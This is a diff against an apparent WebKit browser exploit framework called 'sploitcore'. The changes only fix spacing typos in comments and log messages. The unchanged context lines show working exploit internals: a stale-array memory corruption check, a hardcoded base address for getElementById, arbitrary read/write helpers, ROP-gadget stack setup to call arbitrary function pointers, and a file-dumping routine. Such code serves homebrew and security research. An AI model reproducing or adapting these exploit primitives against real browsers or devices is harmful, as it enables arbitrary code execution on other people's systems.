@@ -102,7 +102,7 @@ var sploitcore = function() {
 	this.func = document.getElementById;
 	this.func.apply(document, ['']); // Ensure the func pointer is cached at 8:9
 	this.funcaddr = null;
-	this.funcbase = 0x835DC4; // This is the base address forgetElementById in the webkit module
+	this.funcbase = 0x835DC4; // This is the base address for getElementById in the webkit module
 
 	this.leakee = {'b' : null};
 	var leaker = {'a' : this.leakee};
@@ -188,7 +188,7 @@ sploitcore.prototype.setup = function() {
 	Object.defineProperties(target, props);
 	this.stale = target.stale;
 
-	dlog('Checking iftriggered...');
+	dlog('Checking if triggered...');
 	if(this.stale.length == before_len) {
 		log('Failed to overwrite array');
 		return -1;
@@ -204,7 +204,7 @@ sploitcore.prototype.setup = function() {
 	this.temp = new Uint32Array(0x10);
 	this.stale[1] = this.temp;
 
-	dlog('Looking forbuf...');
+	dlog('Looking for buf...');
 
 	for(var i = 0; i < this.bufs.length; ++i) {
 		if(this.bufs[i][0] != 0x41424344) {
@@ -534,7 +534,7 @@ sploitcore.prototype.call = function(funcptr, args, fargs, registers, dump_regs)
 		this.write8(loadarea, block_struct_2, 0x00 >> 2);
 		this.write8(loadgadg, block_struct_2, 0x10 >> 2);
 
-		this.write8(sp, loadarea, 0xF8 >> 2); // Can write an arbitrary stack ptr here, forargument passing
+		this.write8(sp, loadarea, 0xF8 >> 2); // Can write an arbitrary stack ptr here, for argument passing
 		this.write8(loadgadg_stage2, loadarea, 0x100 >> 2); // Return from load to load-stage2
 
 		sp = add2(sp, -0x80);
@@ -573,7 +573,7 @@ sploitcore.prototype.call = function(funcptr, args, fargs, registers, dump_regs)
 		}
 
 		this.write8(funcptr, loadarea, 0x80 >> 2); // Set the code to call to our function pointer.
-		this.write8(load_x19, sp, 0xD8 >> 2); // Set Link Register forour arbitrary function to point to cleanup rop
+		this.write8(load_x19, sp, 0xD8 >> 2); // Set Link Register for our arbitrary function to point to cleanup rop
 
 		// Stack arguments would be bottomed-out at sp + 0xE0...
 		// TODO: Stack arguments support. Would just need to figure out how much space they take up
@@ -817,7 +817,7 @@ sploitcore.prototype.dumpFile = function(fn) {
 		var arr = new ArrayBuffer(0x800000);
 		var int8view = new Uint8Array(arr);
 		var outbuf = this.read8(this.getAddr(int8view), 4);
-		var sz = fsize[0]; // XXX: Add primitive forconverting our double-uint32 arrays into numbers
+		var sz = fsize[0]; // XXX: Add primitive for converting our double-uint32 arrays into numbers
 		while (sz > 0) {
 			if(sz < 0x800000) {
 				arr = new ArrayBuffer(sz);
